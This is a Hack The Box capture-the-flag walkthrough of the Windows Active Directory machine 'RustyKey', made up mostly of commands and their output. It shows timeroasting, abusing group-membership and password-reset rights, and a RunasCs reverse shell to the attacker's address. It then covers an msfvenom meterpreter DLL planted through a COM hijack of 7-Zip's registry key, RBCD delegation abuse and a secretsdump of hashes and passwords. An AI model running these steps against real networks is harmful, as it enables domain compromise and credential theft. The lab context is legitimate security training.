---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Resource-Based-Constrained-Delegation
  - S4U2Self
  - COM-Hijack
  - DcSync
  - Timeroasting
---
# Overview

| Name        | RustyKey  |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Hard [40] |
| Status      | Done      |

As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: `rr.parker` / `8#t5HE8L!W3A`
# Recon
## Nmap

```bash
❯ nmap rustykey.htb -A      

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 13:48:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
```
# Enumeration

```bash
❯ nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'                                                                                        ⏎
SMB         10.10.11.75     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.75     445    NONE             [-] \rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 

❯ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'
LDAP        10.10.11.75     389    dc.rustykey.htb  [*]  x64 (name:dc.rustykey.htb) (domain:rustykey.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.75     389    dc.rustykey.htb  [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

```bash
$ cat /etc/krb5.conf
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    RUSTYKEY.HTB = {
        kdc = 10.10.11.75
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

Request a Kerberos ticket for authentication.

```bash
$ impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in rr.parker.ccache
```

```bash
$ export KRB5CCNAME=rr.parker.ccache
```

```bash
$ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

```bash
$ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.11.75     389    DC               Administrator                 2025-06-05 04:37:22 0        Built-in account for administering the computer/domain
LDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-27 06:38:40 0        Key Distribution Center Service Account
LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-05 04:39:15 0
LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 16:03:39 0
LDAP        10.10.11.75     389    DC               bb.morgan                     2025-10-26 02:46:39 0
LDAP        10.10.11.75     389    DC               gg.anderson                   2025-10-26 02:46:39 0
LDAP        10.10.11.75     389    DC               dd.ali                        2025-10-26 02:46:39 0
LDAP        10.10.11.75     389    DC               ee.reed                       2025-10-26 02:46:39 0
LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 17:19:50 0
LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-30 06:15:18 0
```
## [Timeroasting](https://github.com/SecuraBV/Timeroast)

```bash
$ nxc smb rustykey.htb -u '' -p '' -M timeroast
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.75     445    10.10.11.75      [-] 10.10.11.75\: STATUS_NOT_SUPPORTED
TIMEROAST   10.10.11.75     445    10.10.11.75      [*] Starting Timeroasting...
TIMEROAST   10.10.11.75     445    10.10.11.75      1000:$sntp-ms$7277ffc1ddfa06f82603a09ff4f020f0$1c0111e900000000000a21124c4f434ceca78f276f624cfce1b8428bffbfcd0aeca7bac1e39b81d1eca7bac1e39bb92e
TIMEROAST   10.10.11.75     445    10.10.11.75      1103:$sntp-ms$b29dffd5b7f0c5ae7e04a0782995b5f5$1c0111e900000000000a21134c4f434ceca78f276c9e4bb0e1b8428bffbfcd0aeca7bac29cbed740eca7bac29cbf3534
TIMEROAST   10.10.11.75     445    10.10.11.75      1104:$sntp-ms$6149ebe3474a2b7598b927077f990a9e$1c0111e900000000000a21134c4f434ceca78f276eaa8eb4e1b8428bffbfcd0aeca7bac29ecb1897eca7bac29ecb768b
TIMEROAST   10.10.11.75     445    10.10.11.75      1105:$sntp-ms$125a69c2eed984c0b53cec8c318a8dad$1c0111e900000000000a21134c4f434ceca78f276c65db26e1b8428bffbfcd0aeca7bac2a09f043ceca7bac2a09f4906
TIMEROAST   10.10.11.75     445    10.10.11.75      1106:$sntp-ms$92d42a9c8705958061439533dc04fc79$1c0111e900000000000a21134c4f434ceca78f276c66c45ae1b8428bffbfcd0aeca7bac2a09ffadceca7bac2a0a02edf
TIMEROAST   10.10.11.75     445    10.10.11.75      1107:$sntp-ms$5db34f2135908ccce54ceae79e296d03$1c0111e900000000000a21134c4f434ceca78f276e7735c1e1b8428bffbfcd0aeca7bac2a2b0516ceca7bac2a2b0a1f3
TIMEROAST   10.10.11.75     445    10.10.11.75      1118:$sntp-ms$b8d6690f15daf67156abe543603d446e$1c0111e900000000000a21134c4f434ceca78f276d22dca3e1b8428bffbfcd0aeca7bac2b553d7eeeca7bac2b554195c
TIMEROAST   10.10.11.75     445    10.10.11.75      1119:$sntp-ms$00e32b285f4aaa7ffdf950c5e7bca53f$1c0111e900000000000a21134c4f434ceca78f276f3ef6b5e1b8428bffbfcd0aeca7bac2b76fe2e6eca7bac2b77036c9
TIMEROAST   10.10.11.75     445    10.10.11.75      1120:$sntp-ms$4562e80660348a196383c8ddc1a0ef40$1c0111e900000000000a21134c4f434ceca78f276d77d7a7e1b8428bffbfcd0aeca7bac2b97fd679eca7bac2b9801cf0
TIMEROAST   10.10.11.75     445    10.10.11.75      1121:$sntp-ms$2f417056a8fde9abc80410ad676078ef$1c0111e900000000000a21134c4f434ceca78f276d79bc84e1b8428bffbfcd0aeca7bac2b981bd04eca7bac2b9820883
TIMEROAST   10.10.11.75     445    10.10.11.75      1122:$sntp-ms$f1461d6fd34a984e3c02e8dd18f8281e$1c0111e900000000000a21134c4f434ceca78f276f7cb7e1e1b8428bffbfcd0aeca7bac2bb84aca2eca7bac2bb850232
TIMEROAST   10.10.11.75     445    10.10.11.75      1123:$sntp-ms$1f8acad6fe4c2e57be5ce8b83fd6c0ad$1c0111e900000000000a21134c4f434ceca78f276d6f66c0e1b8428bffbfcd0aeca7bac2bd8fffbceca7bac2bd904486
TIMEROAST   10.10.11.75     445    10.10.11.75      1125:$sntp-ms$e19938363165ba7a9646b6371f27d095$1c0111e900000000000a21134c4f434ceca78f276f81768de1b8428bffbfcd0aeca7bac2bfa21b48eca7bac2bfa24d9d
TIMEROAST   10.10.11.75     445    10.10.11.75      1124:$sntp-ms$a1848fb0a6d863dd580d7ae49a04d021$1c0111e900000000000a21134c4f434ceca78f276f800f84e1b8428bffbfcd0aeca7bac2bfa0a881eca7bac2bfa0e339
TIMEROAST   10.10.11.75     445    10.10.11.75      1126:$sntp-ms$fbb4faabd3ee3d92a08b3b233a3248dd$1c0111e900000000000a21134c4f434ceca78f276da97e13e1b8428bffbfcd0aeca7bac2c1e29d18eca7bac2c1e2f0fb
TIMEROAST   10.10.11.75     445    10.10.11.75      1127:$sntp-ms$34e01d464a7173addd478f0ff2c1592b$1c0111e900000000000a21134c4f434ceca78f276f897c15e1b8428bffbfcd0aeca7bac2c3c28a53eca7bac2c3c2eefd
```

```bash
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$sntp-ms$d7e7fef91094a412a2e8cb82c7716f1a$1c0111e900000000000a10504c4f434cec0d09c52308c3f3e1b8428bffbfcd0aec0d1f46bb191728ec0d1f46bb193052:Rusty88!
Approaching final keyspace - workload adjusted.
```

```bash
❯ bloodhound-python  -u 'rr.parker' -p '8#t5HE8L!W3A' -k -d rustykey.htb -ns 10.10.11.75 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 13 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.75:445)] timed out
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.75:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.75:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 37S
INFO: Compressing output into 20250701095916_bloodhound.zip
```
# Initial Foothold

![[rustykey.png]]


![[rustykey2.png]]
## AddSelf TO Helpdesk

```bash
$ impacket-getTGT rustykey.htb/'IT-COMPUTER3$':'Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in IT-COMPUTER3$.ccache

$ export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

```bash
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```
## Change Password & GetTGT (Failed)

```shell
❯ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Abc123456@'                     ⏎
[+] Password changed successfully!

❯ impacket-getTGT rustykey.htb/'bb.morgan':'Abc123456@'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

Notice the PROTECTED OBJECTS group, most likely due to restrictions on this group.

![[rustykey3.png]]
## Remove IT From Protection

```bash
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
[+] IT removed from PROTECTED OBJECTS
```

Reset the password.

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Abc123456@'  
```

```bash
$ impacket-getTGT rustykey.htb/'bb.morgan':'Abc123456@'
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in bb.morgan.ccache
```

```bash
$ export KRB5CCNAME=bb.morgan.ccache

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb

*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> ls


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---       10/24/2025  11:02 AM             34 user.txt
```
# Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> download internal.pdf

Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf

Info: Download successful!
```

```
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb  
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100

Hey team,

As part of the new Support utilities rollout, extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations. This is mainly to help streamline ticket resolution related to extraction/compression issues reported by the Finance and IT teams.

Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.

A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.

Thanks,
BB Morgan
IT Department
```

**Key Points from the Email:**

- Extended access granted for archiving tool testing
- Registry-level adjustments being made for context menu actions
- Access is temporary and will be rolled back
- Related to file extraction/compression utilities
- Involves shared workstations
- Support team has elevated permissions during this period

This means that the SUPPORT group has the right to modify the registry and can test compression/decompression related functions.
  
Notice that the EE.REED user is in the SUPPORT group, but is also in the PROTECTED OBJECT group.

![[rustykey4.png]]
## Remove SUPPORT From Protection

```bash
$ export KRB5CCNAME=IT-COMPUTER3\$.ccache                                                                                                         
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
Traceback (most recent call last):
  File "/home/at0m/venv/bin/bloodyAD", line 7, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/at0m/venv/lib/python3.13/site-packages/bloodyAD/main.py", line 323, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/at0m/venv/lib/python3.13/site-packages/bloodyAD/main.py", line 253, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/at0m/venv/lib/python3.13/site-packages/bloodyAD/cli_modules/remove.py", line 186, in groupMember
    await ldap.bloodymodify(
        group, {"member": [(Change.DELETE.value, member_transformed)]}
    )
  File "/home/at0m/venv/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 306, in bloodymodify
    raise err
badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=Protected Objects,CN=Users,DC=rustykey,DC=htb (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.
```

Repeat above process again if you get above error because configuration might have been revoked.

```bash
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK

$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
[+] IT removed from PROTECTED OBJECTS
```

```bash
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
[+] SUPPORT removed from PROTECTED OBJECTS
```
## Reset `EE.REED` 

```bash
$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Abc123456@'
[+] Password changed successfully!
```

```bash
$ evil-winrm -i dc.rustykey.htb -u ee.reed -p 'Abc123456@'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type ArgumentError happened, message is unknown type: 2061232681

Error: Exiting with code 1
```

We need to get Shell another way.
## RunasCs (ee.reed)

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> .\RunasCS.exe ee.reed Abc123456@ powershell.exe -r 10.10.14.148:6666
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-b21d306$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 18588 created in background.
```

```powershell
$ rlwrap nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.10.14.148] from (UNKNOWN) [10.10.11.75] 52469
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed
```

Windows applications often call COM components through CLSID (Class ID). The system will load the corresponding DLL or EXE according to the configuration in the registry. An attacker can: ​​Tamper with the registry key of an existing COM component​​ to point to a malicious DLL. The possible information is given in the above PDF.
## COM Hijack

```
- The **Support group** is temporarily granted **Extended Permissions** for testing and troubleshooting file archiving (compression/decompression) functionality on shared workstations.

- Registry adjustments may be made during this period.

COM Hijack:
- Hijacks the registry key (CLSID) of a COM component and modifies InprocServer32 to point to a malicious DLL/EXE.
- Affects all programs that call the COM component, targeting Windows components or programs that load COM.
- The hijack is wide-ranging, spanning processes, and can be used to bypass UAC for privilege escalation.
- The hijack occurs in the registry, exploiting the loading process of COM objects.
```

Since the registry is related to compression, let's first check the possible CLSIDs.

```powershell
PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

End of search: 14 match(es) found.
```

Noticing this 7-Zip, I then used `msfvenom` to generate a malicious DLL.

```bash
$ # Generate stageless meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.148 LPORT=4444 -f dll -o hack_stageless.dll
```

```powershell
*Evil-WinRM* PS C:\Windows\Temp> upload hack_stageless.dll

Info: Uploading /home/at0m/hack_stageless.dll to C:\Windows\Temp\hack_stageless.dll

Data: 356352 bytes of 356352 bytes copied

Info: Upload successful!
```

Modify the registry after uploading.

```powershell
PS C:\Windows\system32> # Check if 7-Zip COM component exists
reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"
# Check if 7-Zip COM component exists
PS C:\Windows\system32> reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
```

Hijack it.

```powershell
PS C:\Windows\Temp> ls
ls


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2025  11:02 AM                vmware-SYSTEM
-a----       10/25/2025   4:49 PM           9216 hack.dll
-a----       10/24/2025  11:02 AM            102 silconfig.log
------       10/24/2025  11:03 AM         389969 vmware-vmsvc-SYSTEM.log
-a----       10/24/2025  11:02 AM            486 vmware-vmtoolsd-SYSTEM.log
-a----       10/24/2025  11:02 AM          19713 vmware-vmvss-SYSTEM.log
-a----       10/25/2025   4:27 PM           1044 WERD1C6.tmp.WERDataCollectionStatus.txt


PS C:\Windows\Temp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\Temp\hack_stageless.dll" /f

The operation completed successfully.
```

**`reg add`** - Add/modify Windows registry

**`"HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"`**

- `HKLM` - Registry section for all users
- `CLSID\{...}` - 7-Zip component ID
- `InprocServer32` - DLL that gets loaded

**`/ve`** - Modify the "default" value
**`/f`** - Force overwrite without asking

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.148
set LPORT 4444
run 
```

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.148:4444
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 1 opened (10.10.14.148:4444 -> 10.10.11.75:58281) at 2025-10-26 05:46:29 +0545

meterpreter > shell
Process 19224 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rustykey\mm.turner
```
## (RBCD) [Resource-based constrained delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

Check the permissions of `mm.turner`.

![[RustyKey5.png]]

`mm.turner` is member of `DELEGATIONMANAGER` and `DELEGATIONMANAGER` has `AddAllowedtoAct` in  DC.

This delegation configuration represents a significant privilege escalation opportunity through **Resource-Based Constrained Delegation (RBCD)**. Since `mm.turner` is a member of the `DELEGATIONMANAGER` group which holds the `AddAllowedtoAct` permission on the Domain Controller, this user can configure any computer account (including newly created ones) to be trusted for delegation to the DC.

In practical terms, this means we can create a fake computer account, configure it with RBCD permissions to impersonate users to the Domain Controller, and then use the S4U2proxy Kerberos extension to obtain a service ticket as any user (including Administrator) to the DC's services. This effectively allows us to achieve domain compromise by granting ourselves administrative access to the Domain Controller through Kerberos delegation abuse, bypassing normal authentication controls and obtaining SYSTEM-level privileges on the most critical server in the domain.

Allow the computer account `IT-COMPUTER3$` to delegate (**the power to act on your behalf**) authentication to the Domain Controller (`DC$`):

```powershell
C:\Windows>powershell.exe
powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Windows>  Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

![[RustyKey6.png]]
### S4U2self

```bash
$ export KRB5CCNAME=IT-COMPUTER3\$.ccache

$ impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

```bash
$  export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache

$ impacket-wmiexec -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin

C:\>cd c:\administrator
The system cannot find the path specified.

C:\>cd c:\Users\administrator
c:\Users\administrator>cd Desktop
c:\Users\administrator\Desktop>type root.txt
398dfbc6956ed5834b619dbcbab2eec0
```

We can also try DCSync.
### DCSync Alternative

```bash
❯ impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
[*] DefaultPassword 
RUSTYKEY\Administrator:Rustyrc4key#!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
[*] NL$KM 
 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
